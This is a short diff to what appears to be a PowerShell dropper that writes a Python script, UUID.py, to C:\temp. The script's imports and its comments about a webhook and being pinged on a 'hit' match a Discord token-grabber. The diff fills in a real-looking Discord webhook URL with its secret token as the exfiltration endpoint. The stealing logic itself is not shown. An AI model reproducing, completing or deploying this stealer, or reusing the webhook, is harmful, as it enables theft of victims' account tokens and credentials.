@@ -1,6 +1,7 @@
 cd C:\temp
 Set-Content UUID.py "
 
+
 import os
 import re
 import json
@@ -9,7 +10,7 @@ import base64
 from urllib.request import Request, urlopen
 
 # your webhook URL
-WEBHOOK_URL = $hookurl
+WEBHOOK_URL = https://discord.com/api/webhooks/1063580636759208079/CtpfWa200f-qGmkwZoGh-C-8Ei0bVgjZbffvMLZoMiNIzY1TfiayMRoDT7xA9QDeIaY8
 
 # mentions you when you get a hit
 PING_ME = False
